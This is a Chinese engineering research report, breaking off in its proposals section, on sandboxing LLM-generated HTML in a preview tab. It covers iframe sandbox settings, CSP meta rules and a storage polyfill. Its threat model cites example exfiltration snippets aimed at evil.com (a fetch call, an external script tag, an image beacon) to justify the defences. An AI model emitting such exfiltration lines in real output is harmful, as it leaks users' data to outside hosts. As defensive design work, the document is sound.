# Work 模式 M3.5 调研报告：格式无关交互内容预览（L2）

> 状态：**Draft - 待立项评审**（M3 L1 已完成并合入 main；本版纳入竞品调研修订：从"独立 HTML 图表"重新定位为"格式无关交互内容预览"，借鉴 Claude Artifacts / E2B Fragments 架构）
> 日期：2026-08-08（初版）/ 2026-08-08（竞品调研修订）
> Owner：产品 + Core + App + Security
> 依据：[Work PRD v4.1](../prd/work-mode-execution-layer.md) §5/§13、[Work 路线图](work-mode-roadmap.md) §3.6、[M3 调研报告](work-mode-m3-research.md)（L1/L2 分层）、[全栈可视化文档](../全栈项目团队与流程可视化.md)（L2 形态范例）、CSP 现状（[ui.ts:12](packages/aigcfroge/src/server/shared/ui.ts)）、[竞品调研](m3.5-competitor-research.md)（Claude Artifacts / E2B Fragments / v0 / Canvas + 三反编译）
> 关联：[Work M3 计划](work-mode-execution-layer-m3.md)（L1 已完成）、[ADR-13](../architecture/adr/ADR-13-chat-work-mode-boundary.md) / [ADR-14](../architecture/adr/ADR-14-persistence-and-scope-strategy.md)

---

## 0. 本版修订说明（相对初版）

初版将 M3.5 定位为"独立 HTML 图表产出"（Vis.js/Chart.js/ECharts），范围过窄。结合产品方向（"不能固定某个格式，需根据用户需求产出内容到预览 Tab"）与竞品调研（Claude Artifacts / E2B Fragments），本版重新定位：

| 项           | 初版假设                   | 本版修正                                                                                                                                   |
| ------------ | -------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| **定位**     | 独立 HTML 图表产出         | **格式无关交互内容预览**（预览 Tab = 渲染器注册表，按格式路由）                                                                            |
| **格式**     | 仅 HTML                    | HTML + SVG +（未来 React/其他）--LLM 按需选格式                                                                                            |
| **架构参考** | 无（三竞品均无）           | **Claude Artifacts**（浏览器 iframe srcdoc）+ **E2B Fragments**（格式路由 + 结构化输出，[代码核验](https://github.com/e2b-dev/fragments)） |
| **图表库**   | M3.5 的定义特征            | LLM 可用的**工具**，非 M3.5 定义特征；self-hosted 供 HTML 引用                                                                             |
| **安全模型** | iframe sandbox（初版已定） | **Claude 验证**：`allow-scripts` 不加 `allow-same-origin` + srcdoc 内联 + CSP meta                                                         |

**二次修订（竞品深度剖析后）**：纳入 Claude MIME-Type 分发机制（`application/vnd.ant.*`）、Canvas 重新评级（⭐⭐→⭐⭐⭐，highlight-to-edit 是未来 Work 增强非 M3.5）、v0 Firecracker microVM 细节。明确**三条演进方向**（① 渲染增强=M3.5 / ② Canvas 式局部编辑=未来 M4+ / ③ 版本滑块=未来 M4+），防止 M3.5 范围蔓延。详见 [竞品调研](m3.5-competitor-research.md) §5.1。

**三次修订（用户联网核验后）**：Claude/Canvas/v0 细节从 ⚠️ 待核验升级为 ✅ 已核验。**新增关键安全细节**：Claude 禁用 iframe 内 localStorage/sessionStorage，强制 React useState 内存态（防恶意 JS 持久化 payload）。M3.5 安全模型纳入此威胁（§4.4 新增存储隔离行 + §7.3 借鉴 #9）。

**四次修订（工程严密化）**：5 个核心工程风险核验并定方案：① **null origin CORS 阻断** -> Inline Script Injection（库文本内联 `<script>`，§4.5）；② **srcdoc CSP 继承父级** -> iframe 原生 `csp` 属性 + `<meta>` 双重防线（§8.2）；③ **localStorage SecurityError 崩溃** -> Storage Mock Polyfill 内存 Map 垫片（§8.2 防线 3）；④ **LLM HTML 质量不稳定** -> iframe onerror 优雅降级 + Code/Preview 切换（§9.2）；⑤ **格式标记** -> ```html 首选 + artifact 标签兼容的宽松流式解析器（§10.1 #2 已定）。M3.5 达工程严密级。

---

## 1. M3.5 功能定义（大白话）

**M3（L1，已完成）**：Work 候选稿支持 Mermaid 内嵌图表（```mermaid -> SVG），覆盖流程/拓扑/时序/甘特/数据/思维导图 15+ 类型。静态 SVG，无交互，安全（无 script）。

**M3.5（L2，本次调研）**：Work 预览 Tab 升级为**格式无关的交互内容预览器**--LLM 根据用户需求产出任意格式内容（HTML/SVG/未来 React），预览 Tab **按格式路由到对应渲染器**，支持交互（点击/拖拽/过滤/CSS 框架/JS 库）。

**核心理念**（对齐产品方向）：**不固定格式**。用户要静态图 -> LLM 用 Mermaid（L1）；要交互拓扑/大屏/原型 -> LLM 用 HTML（L2）；要纯文档 -> Markdown（M1）。预览 Tab 是**渲染器注册表**，识别格式并渲染，不是"图表渲染器"。

**典型场景**：

- 团队全景拓扑（Vis.js 拖拽节点、点击高亮关系）-> HTML
- RACI 责任矩阵交互过滤 -> HTML
- 数据大屏（多图表联动）-> HTML
- 复杂 SVG 插画/流程图（超 Mermaid 能力）-> SVG
- 静态流程/时序/甘特 -> Mermaid（L1 已覆盖）

**为什么 L2 ≠ L1**：Mermaid（L1）是静态 SVG，无法表达交互、CSS 框架、JS 库。L2 是"小型 HTML/SVG 应用"，不是"图表"。

---

## 2. 需求来源与矛盾澄清

### 2.1 PRD 矛盾

| 来源                | 描述                                                                                                                       | 倾向                                                |
| ------------------- | -------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------- |
| PRD §5.1 数据分析师 | ✅ "基于 Schema 字典强校验的 SQL 分析与因果推断"，交付物 = **Markdown Data Insights**；❌ 拒绝"报而不析的静态指标看板堆叠" | **L1 已覆盖**（Mermaid pie/xychart 在 Markdown 内） |
| PRD §13 M3 扩展产出 | "引入 DataAnalysis / 图表 HTML 产出（**需 CSP 安全隔离**）"                                                                | **L2 范畴**                                         |
| 路线图 §3.6         | "独立 HTML 图表产出（全栈可视化 4 模块 / 数据大屏）"                                                                       | L2                                                  |
| 全栈可视化文档      | "高保真交互式 HTML 可视化预览系统"（4 模块 + Tailwind + Vis.js）                                                           | L2 形态范例                                         |

**矛盾澄清**：§5.1 数据分析师交付物是"Markdown Data Insights"（L1 已覆盖）；L2 是**新场景**--汇报/教学/交互可视化大屏，用户需"可交互内容"而非"静态文档"。L2 不是 L1 升级，是扩展产出形态。

### 2.2 真伪需求判定（待产品确认）

| 场景                              | 真需求？ | 频率           | L1 是否够                                  |
| --------------------------------- | -------- | -------------- | ------------------------------------------ |
| 团队全景拓扑（Vis.js 交互网络图） | 待确认   | 低（汇报场景） | ❌ Mermaid graph 静态 SVG，无拖拽/物理引擎 |
| RACI 矩阵交互过滤                 | 待确认   | 低             | ❌ Mermaid 无表格交互                      |
| 数据大屏（多图表联动）            | 待确认   | 低             | ❌ Mermaid 单图，无组合看板                |
| 交互原型/计算器/小工具            | 待确认   | 低             | ❌ 需 JS 交互                              |
| 流程图/时序图/甘特                | ✅ 真    | 高             | ✅ L1 Mermaid 已覆盖                       |
| 数据占比/趋势                     | ✅ 真    | 中             | ✅ L1 Mermaid pie/xychart 已覆盖           |

**产品需回答**：交互可视化场景是否真实高频？若低频且非核心，L2 可继续延后；若是差异化卖点，立项 M3.5。

---

## 3. 渲染架构：格式路由（renderer registry）

### 3.1 架构借鉴

借鉴 [E2B Fragments](https://github.com/e2b-dev/fragments) 的格式路由模式（[fragment-preview.tsx](https://github.com/e2b-dev/fragments/blob/main/components/fragment-preview.tsx) 代码核验）+ Claude Artifacts 的浏览器 iframe srcdoc 安全模型。

**E2B 格式路由代码**（核验）：

```tsx
export function FragmentPreview({ result }) {
  if (getTemplateId(result.template) === "code-interpreter-v1") {
    return <FragmentInterpreter result={result} /> // Python stdout
  }
  return <FragmentWeb result={result} /> // iframe 预览
}
```

### 3.2 AigcForge 预览 Tab 渲染器注册表

````
LLM 产出（带格式标记）
  -> 预览 Tab 格式检测 -> 路由到渲染器
     ├─ Markdown          -> markdown renderer（M1 已有）
     ├─ ```mermaid        -> mermaid renderer（M3 L1 已有，renderMermaidBlocks）
     ├─ ```html           -> iframe sandbox renderer（M3.5 新建）
     │     <iframe sandbox="allow-scripts" srcdoc="<HTML + CSP meta>">
     ├─ ```svg            -> sanitize 后直接注入（DOMPurify svg profile）
     └─ 未来: ```react    -> iframe + 预打包 React 运行时（借鉴 Claude，远期）
````

**格式检测**：从 fenced code block 语言标推断（`html / `svg），或更显式的 artifact 标记（待定，见 §10.1 #2）。

**Claude Artifacts 的工业级实现**（✅ 已核验）：用 MIME-Type 驱动分发--LLM 产 `<antArtifact type="...">`，前端按 type 路由：

- `application/vnd.ant.react` -> 内置 React 运行时编译 JSX/TSX
- `text/html` -> iframe sandbox 单文件渲染
- `application/vnd.ant.mermaid` -> 客户端 SVG 绘制
- `image/svg+xml` -> 原生 SVG（响应式 viewBox）
- `text/markdown` / `application/vnd.ant.code` -> Markdown / 代码高亮

AigcForge 用 fenced code block 语言标（`html/`svg/```mermaid）是轻量等效--不需要 MIME-Type 那么重，但路由模式一致。

**关键**：预览 Tab 是**渲染器注册表**，新增格式 = 新增渲染器，不改变现有链路。M1（Markdown）+ M3 L1（Mermaid）已有渲染器，M3.5 新增 HTML/SVG 渲染器。

### 3.3 LLM 产出方式：结构化（借鉴 E2B schema + Claude antArtifact）

借鉴 E2B 的结构化输出（[lib/schema.ts](https://github.com/e2b-dev/fragments/blob/main/lib/schema.ts) Zod schema）+ Claude 的显式 type 标签：

- **E2B**：LLM 产 Zod 结构化 artifact（template + code + deps + port），Vercel AI SDK `streamObject` 流式
- **Claude**：LLM 产 `<antArtifact type="text/html">` 结构化标签，显式 type 字段

**AigcForge 方案**（待定）：LLM 用 fenced code block（`html/`svg）产出，格式从语言标推断。或更显式的 artifact 标记。**不强制结构化 JSON 输出**（对齐 M1 候选稿=消息正文的载体）。

---

## 4. CSP 现状与 iframe sandbox 可行性

### 4.1 CSP 现状

[ui.ts:12](packages/aigcfroge/src/server/shared/ui.ts)：

```
default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline';
img-src 'self' data: https:; font-src 'self' data:; media-src 'self' data:; connect-src * data:
```

- `script-src 'self' 'wasm-unsafe-eval'` -- **不允许 inline script**
- L2 HTML 含 inline `<script>` --**直接注入主页面违反 CSP**

### 4.2 iframe sandbox 方案（Claude Artifacts 验证）

Claude Artifacts（✅ 已核验）用**浏览器 iframe srcdoc**渲染 HTML/React artifact，`sandbox="allow-scripts"`（**不加** `allow-same-origin`）+ **禁用 localStorage/sessionStorage**（强制 useState 内存态）。此模型是 AigcForge 本地优先桌面的最佳选择。

| 配置                                        | 安全性  | 说明                                                                                    |
| ------------------------------------------- | ------- | --------------------------------------------------------------------------------------- |
| `sandbox="allow-scripts"`                   | ✅ 安全 | iframe 可运行 JS，但**不可访问父页面**（null origin，读不到父 DOM/cookie/localStorage） |
| `sandbox="allow-scripts allow-same-origin"` | ❌ 危险 | iframe 可访问父页面 origin -- XSS 升级。**AigcForge 禁止**                              |
| 无 sandbox                                  | ❌ 危险 | iframe JS 直接在父 origin 运行                                                          |

**⚠️ E2B 用了 `allow-same-origin` 但 AigcForge 不可照搬**：[E2B fragment-web.tsx](https://github.com/e2b-dev/fragments/blob/main/components/fragment-web.tsx) 用 `sandbox="allow-forms allow-scripts allow-same-origin"` + `src={result.url}`（指向云沙箱 URL）。E2B 能加 `allow-same-origin` 是因 iframe 指向**独立云沙箱 origin**（与主 app 不同 origin）。AigcForge iframe 共享 app origin，`allow-same-origin` = iframe JS 可读父 DOM/cookie = XSS 升级。**必须 `allow-scripts` only + srcdoc 内联**。

### 4.3 加载方式：srcdoc（非 blob/URL）

| 方式       | 做法                                               | 选用                                                |
| ---------- | -------------------------------------------------- | --------------------------------------------------- |
| **srcdoc** | `<iframe sandbox="allow-scripts" srcdoc="<HTML>">` | ✅ **选用**（Claude 同款；HTML 作为属性传入，简单） |
| blob: URL  | `URL.createObjectURL(new Blob([html]))`            | 备选（大 HTML 时）                                  |
| 外部 URL   | `src={sandbox_url}`                                | ❌ 不选（E2B 用此，但需云沙箱，AigcForge 无）       |

### 4.4 安全威胁模型

| 威胁                             | 来源                                         | sandbox 是否兜住                           | 缓解                                                                                    |
| -------------------------------- | -------------------------------------------- | ------------------------------------------ | --------------------------------------------------------------------------------------- |
| iframe JS 读父 DOM/cookie        | LLM 产恶意 JS（prompt injection）            | ✅ sandbox null origin 隔离                | `allow-scripts` 不加 `allow-same-origin`                                                |
| iframe JS 向外发请求（数据外泄） | LLM 产 `fetch('https://evil.com')`           | ❌ sandbox 不限网络                        | srcdoc 内 CSP `<meta>`：`connect-src 'none'`                                            |
| CDN 供应链攻击                   | LLM 产 `<script src="https://cdn.evil.com">` | ❌ sandbox 允许外部资源                    | srcdoc CSP `script-src 'self'`（只允许 self-hosted 库）                                 |
| iframe JS 调 localStorage 崩溃   | LLM/第三方库调 `window.localStorage`         | ❌ 抛 **SecurityError 不可捕获**，脚本挂起 | **Storage Mock Polyfill**（§8.2 防线 3）：head 注入内存 Map 垫片，规避崩溃 + 锁死持久化 |
| iframe 钓鱼覆盖父 UI             | LLM 产全屏内容                               | 部分                                       | iframe 固定尺寸 + `aria-label` + 边框                                                   |

**关键**：`sandbox="allow-scripts"` 隔离**同源访问**，但**不隔离网络**。必须 srcdoc 内加 CSP `<meta>` 限制 `connect-src`/`img-src` 防外泄。**存储隔离**：null origin 下 localStorage/sessionStorage 已分区隔离（不可读父页面 storage）；SYSTEM_PROMPT 指引 LLM 用内存状态（对齐 Claude）。

### 4.5 图表库加载：Inline Script Injection（规避 null origin CORS 阻断）

Claude React artifact 用**预打包白名单库**（iframe 内预装 React + recharts/lucide 等）。AigcForge 同理，但加载方式有**关键工程约束**：

**⚠️ 核验发现（null origin CORS 阻断）**：`sandbox="allow-scripts"`（无 `allow-same-origin`）下 iframe 被强制为 **unique null origin**。从 null origin 向 `http://localhost` / Tauri `asset://` 发 HTTP 请求加载 `/assets/vis.js` -> 浏览器标记为**跨域** -> 本地 asset server 缺 CORS 响应头 -> **脚本加载失败**。原"self-hosted /assets/ + Phase A 实测 CORS"方案有阻断风险。

| 方式                                                  | 安全          | 离线      | null origin 可行                      | 选用        |
| ----------------------------------------------------- | ------------- | --------- | ------------------------------------- | ----------- |
| CDN                                                   | ❌ 供应链风险 | ❌ 需联网 | ✅（但被 CSP `script-src 'self'` 禁） | ❌          |
| self-hosted `/assets/` URL                            | ✅ self       | ✅        | ❌ **CORS 阻断**（null origin 跨域）  | ❌          |
| **Inline Script Injection**                           | ✅            | ✅        | ✅ **零 HTTP 请求**                   | ✅ **首选** |
| self-hosted + `Access-Control-Allow-Origin: *` 响应头 | ✅            | ✅        | ✅（需改 asset server）               | 备选        |

**首选方案：Inline Script Injection**。后端构造 srcdoc HTML 时，将本地库文件文本（如 `vis-network.min.js`）**直接嵌入** `<script>/* vis.js code */</script>` 节点。零 HTTP 请求、零跨域风险，100% 在 null origin 下稳定运行。

**代价**：srcdoc HTML 膨胀（Vis.js ~200KB inline），但可接受（单候选稿 HTML 通常 < 500KB，srcdoc 可承载）。

**备选**：若 inline 膨胀不可接受，在 app 内置 HTTP 静态服务响应头显式加 `Access-Control-Allow-Origin: *`（需验证 Tauri/Electron asset server 可配置 CORS）。

---

## 5. 图表库选型（LLM 可用工具，非 M3.5 定义特征）

**定位修正**：图表库是 LLM 产 HTML 时可引用的**工具**，self-hosted 打包供 iframe 加载。M3.5 的核心是"HTML 渲染器 + 安全方案"，不是"某个图表库"。

### 5.1 候选库

| 库                 | 类型                        | 包体（min+gzip） | 适用场景                                  | 全栈可视化文档使用     |
| ------------------ | --------------------------- | ---------------- | ----------------------------------------- | ---------------------- |
| **Vis.js Network** | 拓扑/网络图                 | ~200KB           | 协作网络拓扑、依赖图（交互拖拽+物理引擎） | ✅ 模块四 Relation Map |
| **Chart.js**       | 数据图表（柱/线/饼/雷达）   | ~70KB            | 数据趋势/占比/对比（canvas 渲染）         | ❌                     |
| **ECharts**        | 综合图表（含拓扑/组合大屏） | ~300KB-1MB       | 数据大屏、多图表联动                      | ❌                     |
| **D3.js**          | 底层可视化                  | ~90KB            | 高度定制（开发成本高）                    | ❌                     |
| Mermaid（L1 已有） | 流程/时序/甘特/数据图       | ~500KB           | 静态图表（无交互）                        | ❌（L1 范畴）          |

### 5.2 推荐

| 场景                 | 推荐库             | 理由                                                          |
| -------------------- | ------------------ | ------------------------------------------------------------- |
| 协作拓扑/网络图      | **Vis.js Network** | 全栈可视化文档选型；拖拽+物理引擎是 Mermaid 无法表达的        |
| 数据图表（柱/线/饼） | **Chart.js**       | 轻量 70KB；L1 Mermaid pie/xychart 已覆盖静态，L2 仅需交互时用 |
| 数据大屏（多图联动） | **ECharts**        | 组合大屏强；包体大 300KB+，仅"大屏"场景动态 import            |

**不推荐 D3.js**：开发成本高，LLM 生成 D3 代码质量不稳定。

**与 L1 关系**：L2 不替代 L1。Mermaid（L1）覆盖静态图表（高频）。L2 仅在需交互时启用（低频）。SYSTEM_PROMPT 指引 LLM："静态图表用 Mermaid，交互可视化用 HTML"。

### 5.3 包体影响

所有库**动态 import**，仅 L2 候选稿时触发，不阻塞首屏（与 Mermaid L1 一致）。

---

## 6. 全栈可视化 4 模块形态（L2 示例用例）

[全栈可视化文档](../全栈项目团队与流程可视化.md) §3 定义的 4 模块是 L2 的**示例产出**之一（非 M3.5 全部范围）：

```
全栈研运协同全景高保真交互式预览系统（单文件 HTML）
├── 模块一：Role Atlas（12 工种卡片图鉴）--Tailwind 卡片 + 点击 Drawer
├── 模块二：Workflow Hub（研运协同流景）--6 阶段时间轴 + 点击展开
├── 模块三：RACI Explorer（责任分配矩阵）--交互表格 + 过滤
└── 模块四：Relation Map（协作拓扑）--Vis.js Network + 节点点击联动
```

**依赖**：Tailwind CSS + Lucide Icons + Vis.js Network（self-hosted）

**关键**：这 4 模块**无法用 Mermaid 表达**（需 CSS 框架 + 交互逻辑 + JS 库）。但 M3.5 不限于这 4 模块--LLM 按用户需求产任意 HTML/SVG 内容。

---

## 7. 竞品参考（7 产品全景）

### 7.1 交互内容预览类（有参考价值）

| 产品                 | 定位                       | 渲染架构                         | 格式路由                                                                               | 安全模型                                                                                                                                  | 借鉴价值                              | 数据来源                                                   |
| -------------------- | -------------------------- | -------------------------------- | -------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------- | ---------------------------------------------------------- |
| **Claude Artifacts** | 多格式富媒体渲染沙箱       | 浏览器 iframe srcdoc             | **MIME-Type 驱动**（application/vnd.ant.react / text/html / .mermaid / image/svg+xml） | `allow-scripts` 无 same-origin + 严格 CSP + **禁用 localStorage/sessionStorage**（强制 useState 内存态）+ 白名单 CDN + React 运行时预打包 | ⭐⭐⭐⭐⭐                            | ✅ 已核验（用户联网）                                      |
| **E2B Fragments**    | 代码执行 + 预览            | 云沙箱 + iframe URL              | template 字段路由                                                                      | `allow-forms allow-scripts allow-same-origin`（云沙箱独立 origin）                                                                        | ⭐⭐⭐⭐                              | ✅ [GitHub 源码核验](https://github.com/e2b-dev/fragments) |
| **ChatGPT Canvas**   | **协同编辑器**（非渲染器） | 编辑器（无 HTML 渲染）           | N/A                                                                                    | N/A                                                                                                                                       | ⭐⭐⭐（**未来 Work 增强**，非 M3.5） | ✅ 已核验（用户联网）                                      |
| **Vercel v0**        | 全栈 AI 工程师             | **Firecracker microVM** + iframe | 仅 React/Next.js                                                                       | 云 microVM 隔离（Kernel-level）                                                                                                           | ⭐⭐                                  | ✅ 已核验（用户联网）                                      |

### 7.2 三反编译竞品（无参考价值）

| 产品                                               | 独立 HTML 图表                                    | 对 M3.5 参考 |
| -------------------------------------------------- | ------------------------------------------------- | ------------ |
| [Accio](../Accio竞品反编译分析报告.md)             | ❌ 无（Task 看板两段式宽度条）                    | 无           |
| [Antigravity](../Antigravity反编译分析报告.md)     | ❌ 无（ThoughtSummary 含图，非图表 HTML）         | 无           |
| [Cherry-Studio](../Cherry-Studio反编译分析报告.md) | ❌ 无（SSE/RAG/多模型）                           | 无           |
| OpenOcta                                           | ❌ 无（Control UI，marked+DOMPurify 纯 Markdown） | 无           |

**结论**：7 个产品中，**Claude Artifacts + E2B Fragments** 有直接参考价值。三反编译竞品 + OpenOcta 均无交互预览。M3.5 是 AigcForge 差异化，但 Claude/E2B 提供了架构范式。

### 7.3 M3.5 借鉴清单（方向 ① 渲染增强）

| #   | 借鉴点                            | 来源                            | AigcForge 落地                                                                                                   |
| --- | --------------------------------- | ------------------------------- | ---------------------------------------------------------------------------------------------------------------- |
| 1   | **MIME-Type 驱动格式路由**        | Claude antArtifact type         | 预览 Tab 按 type 路由（`html/`svg/```mermaid）                                                                   |
| 2   | **结构化输出（type + content）**  | E2B schema + Claude antArtifact | LLM 产代码块 + type 推断                                                                                         |
| 3   | **浏览器 iframe srcdoc**          | Claude Artifacts                | `<iframe sandbox="allow-scripts" srcdoc>`                                                                        |
| 4   | **allow-scripts 严格隔离**        | Claude Artifacts                | null origin，不可访问父页面                                                                                      |
| 5   | **iframe 内 CSP meta**            | 本调研 §4.4                     | `connect-src 'none'` + `script-src 'self'`                                                                       |
| 6   | **两 Tab 布局（Code + Preview）** | E2B preview.tsx                 | WorkArtifactContent 已有 apply，加 Code/Preview 切换                                                             |
| 7   | **self-hosted 白名单库**          | Claude 预打包思路               | Vis.js/Chart.js 打包到 /assets/，禁 CDN                                                                          |
| 8   | **单文件自包含 + Base64 图片**    | Claude Artifacts                | HTML 尽量单文件，图片 Base64 内嵌（离线 + CSP 友好）                                                             |
| 9   | **Storage Mock Polyfill**         | Claude 禁用 storage 启发        | srcdoc head 注入内存 Map 垫片替换 localStorage/sessionStorage，防 SecurityError 崩溃 + 锁死持久化（§8.2 防线 3） |

### 7.3.1 未来 Work 增强借鉴（方向 ②③，**非 M3.5 范围**）

以下来自 ChatGPT Canvas / v0 的交互编辑模式，是**独立的未来 Work 模式增强**（M4+ 方向），**不混入 M3.5 渲染范畴**：

| #   | 借鉴点                           | 来源        | AigcForge 落地                                                                  | 归属     |
| --- | -------------------------------- | ----------- | ------------------------------------------------------------------------------- | -------- |
| 9   | **Highlight-to-edit 局部 Patch** | Canvas      | 选中段落 -> Inline Prompt -> 增量替换（替代 work-orchestrator step 6 全量重写） | 未来 M4+ |
| 10  | **Quick Actions 菜单**           | Canvas      | 润色/扩写/翻译/语法检查 快捷按钮                                                | 未来 M4+ |
| 11  | **版本滑块 + Diff 预览**         | Canvas + v0 | 结合 M1.5 outputDigest，版本历史滑块 + 新旧对比 + Revert                        | 未来 M4+ |
| 12  | **Visual Element Inspector**     | v0          | HTML 预览点选元素 -> 高亮代码 -> 修改（远期）                                   | 远期     |

**⚠️ 范围澄清**：M3.5 = 方向 ①（渲染增强）only。方向 ②（Canvas 式局部编辑）和 ③（版本滑块）是正交的未来增强，避免范围蔓延。详见 [竞品调研 §5.1 三条演进方向](m3.5-competitor-research.md)。

### 7.4 不借鉴

| #   | 不借鉴                           | 原因                                                                        |
| --- | -------------------------------- | --------------------------------------------------------------------------- |
| 1   | **云沙箱执行**（E2B/v0）         | AigcForge 本地优先桌面，不依赖云 Docker                                     |
| 2   | **allow-same-origin**（E2B）     | E2B iframe 指向独立云 origin 可加；AigcForge 共享 app origin，加 = XSS 升级 |
| 3   | **任意 npm install**（E2B/v0）   | 安全风险；用 self-hosted 白名单库                                           |
| 4   | **Code Interpreter**（ChatGPT）  | 云端 Python，非 M3.5 范畴                                                   |
| 5   | **协作编辑器**（Canvas）         | 定位不同，M3.5 是预览非编辑                                                 |
| 6   | **React 预打包运行时**（Claude） | M3.5 先做 HTML（最通用）；React 远期                                        |

---

## 8. 安全方案（iframe sandbox + CSP + 格式路由）

### 8.1 渲染架构

````
work-orchestrator 生成 L2 候选稿（```html 代码块）
  -> WorkArtifactContent 格式检测（识别 ```html / ```svg）
  -> 格式路由：
     ├─ ```html -> iframe sandbox 渲染器
     │    -> sanitizeHtmlLite（剥离外部 script src / javascript: URL，不深度 sanitize JS）
     │    -> <iframe sandbox="allow-scripts" srcdoc="<HTML + CSP meta>">
     │    -> iframe 内：self-hosted 图表库 + 数据渲染（null origin，隔离父页面）
     │    -> 右栏 Artifact Tab 显示 iframe（固定尺寸 + 边框 + 加载态 + 错误降级）
     ├─ ```svg -> DOMPurify svg profile sanitize -> 直接注入
     └─ ```mermaid / Markdown -> 复用 L1/M1 渲染器
````

### 8.2 iframe CSP 双重防线 + Storage Mock Polyfill

**⚠️ 核验发现**：W3C 规范下 srcdoc **继承父级 CSP**。部分 Chromium 版本中，仅靠 `<meta>` 标签可能受父级继承规则影响。需**双重防线**：

**防线 1：iframe 原生 `csp` 属性**（创建 DOM 时设置）：

```html
<iframe
  csp="default-src 'none'; script-src 'unsafe-inline'; connect-src 'none'; img-src 'self' data:;"
  sandbox="allow-scripts"
  srcdoc="<HTML>"
/>
```

**防线 2：srcdoc 头部 `<meta>`**（保留）：

```html
<meta
  http-equiv="Content-Security-Policy"
  content="
  default-src 'none';
  script-src 'unsafe-inline';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self' data:;
  connect-src 'none';
"
/>
```

双重保障 100% 拦截 fetch / XHR / WebSocket / `<img src="https://evil.com/beacon">` 等所有外泄管道。

**防线 3：Storage Mock Polyfill**（防 SecurityError 崩溃）：

**⚠️ 核验发现**：sandbox 无 `allow-same-origin` 时，若 LLM 产代码或第三方库调 `window.localStorage`，WebKit/Blink 抛**不可捕获** `DOMException: SecurityError: The operation is insecure`，后续脚本逻辑**挂起崩溃**。仅靠 SYSTEM_PROMPT 指引不够（LLM/库可能仍调用）。

在 srcdoc `<head>` 最前端注入 polyfill，将 localStorage/sessionStorage 重定向为纯内存 Map：

```html
<script>
  window.localStorage = window.sessionStorage = (function () {
    var store = {}
    return {
      getItem: function (k) {
        return store[k] || null
      },
      setItem: function (k, v) {
        store[k] = String(v)
      },
      removeItem: function (k) {
        delete store[k]
      },
      clear: function () {
        store = {}
      },
    }
  })()
</script>
```

既规避 SecurityError 崩溃，又彻底锁死持久化 payload（内存态，iframe 销毁即清）。

- `script-src 'unsafe-inline'` -- 允许 inline script（含 polyfill + 库 + LLM 代码）；**禁止外部 CDN**
- `connect-src 'none'` -- **禁止网络请求**（防数据外泄）
- `img-src 'self' data:` -- 允许 data URI，禁止外部图片（防 beacon）

**注意**：`'unsafe-inline'` 在 iframe 内可接受（sandbox 已隔离父页面）。风险仅限 iframe 内部（数据外泄被 `connect-src 'none'` 兜住）。

### 8.3 与全局 DOMPurify 的关系

L2 HTML **不经过全局 sanitizeMarkdown**（markdown-cache.tsx config 为 Markdown 设计，会剥 HTML 结构）。L2 用独立轻量 sanitize + iframe sandbox 兜底。**不冲突**：L1（Mermaid）走全局 sanitize + mermaidSvgConfig；L2（HTML）走 iframe sandbox + srcdoc CSP。两条独立链路，由格式路由分发。

### 8.4 候选稿载体与落盘

| 维度       | L1（M1）                    | L2（M3.5）                                      |
| ---------- | --------------------------- | ----------------------------------------------- |
| 候选稿载体 | Markdown 消息正文           | 消息正文含 `html 代码块（对齐 `mermaid 模式）   |
| 提取       | findLatestAssistantMarkdown | findLatestAssistantHtml（类比新建）             |
| 落盘       | .md 文件                    | .html 文件（用户可直接浏览器打开）              |
| 存为资产   | prompt 资产 template=候选稿 | 复用 prompt 资产 template（HTML 作为 template） |

---

## 9. 可行性评估

### 9.1 技术可行性

| 条件                          | 状态      | 说明                                                                              |
| ----------------------------- | --------- | --------------------------------------------------------------------------------- |
| iframe sandbox 浏览器支持     | ✅ 全支持 | Claude Artifacts 已验证此模型可行                                                 |
| Tauri/Electron iframe sandbox | ✅ 支持   | WebView 支持；null origin 加载库用 **Inline Script Injection**（§4.5，规避 CORS） |
| 图表库加载                    | ✅ 可行   | Inline Script Injection（库文本内联 `<script>`，非 /assets/ URL）                 |
| CSP 双重防线                  | ✅ 生效   | iframe 原生 `csp` 属性 + srcdoc `<meta>` 双重保障（§8.2）                         |
| Storage Mock Polyfill         | ✅ 可行   | head 注入内存 Map 垫片，防 SecurityError 崩溃（§8.2 防线 3）                      |
| 格式路由模式                  | ✅ 可行   | E2B fragment-preview.tsx 代码核验，按 type 路由                                   |
| LLM 生成 HTML 质量            | ⚠️ 待验证 | Claude/v0 依赖训练；AigcForge 用 SYSTEM_PROMPT + 模板引导（非训练）               |

### 9.2 风险矩阵

| 风险                                          | 概率 | 影响 | 应对                                                                                                             |
| --------------------------------------------- | ---- | ---- | ---------------------------------------------------------------------------------------------------------------- |
| LLM 产恶意 JS（prompt injection 外泄）        | 中   | 中   | sandbox null origin + `connect-src 'none'`；外泄面仅限图表 HTML 内数据                                           |
| CDN 供应链攻击                                | 中   | 高   | 禁 CDN（srcdoc CSP `script-src 'unsafe-inline'`）；库 inline 注入                                                |
| iframe sandbox 配置错误（allow-same-origin）  | 低   | 高   | 代码审查 + 测试断言 sandbox 不含 allow-same-origin                                                               |
| **null origin CORS 阻断库加载**               | 高   | 高   | **Inline Script Injection**（库文本内联 `<script>`，零 HTTP，§4.5）；备选 asset server 加 CORS 头                |
| **localStorage SecurityError 崩溃**           | 高   | 高   | **Storage Mock Polyfill**（head 注入内存 Map 垫片，§8.2 防线 3）                                                 |
| LLM 产 HTML 质量差（未闭合标签/变量引用错误） | 高   | 中   | SYSTEM_PROMPT 模板 + **iframe onerror 监听 -> 优雅 Banner "交互渲染异常" + 一键切 Code 视图**（E2B 两 Tab 布局） |
| 图表库包体增大 app                            | 低   | 低   | 动态 import（仅 L2 块时触发）；inline 注入增加 srcdoc 体积但可接受                                               |

---

## 10. 立项建议

### 10.1 立项前需确认（产品 + Security）

| #   | 问题                                                                                                                                                                                                                  | 决策方      | 影响                   |
| --- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------- | ---------------------- |
| 1   | 交互可视化场景（团队全景/数据大屏/原型）是否真实高频？是否差异化卖点？                                                                                                                                                | 产品        | 决定 M3.5 值不值得做   |
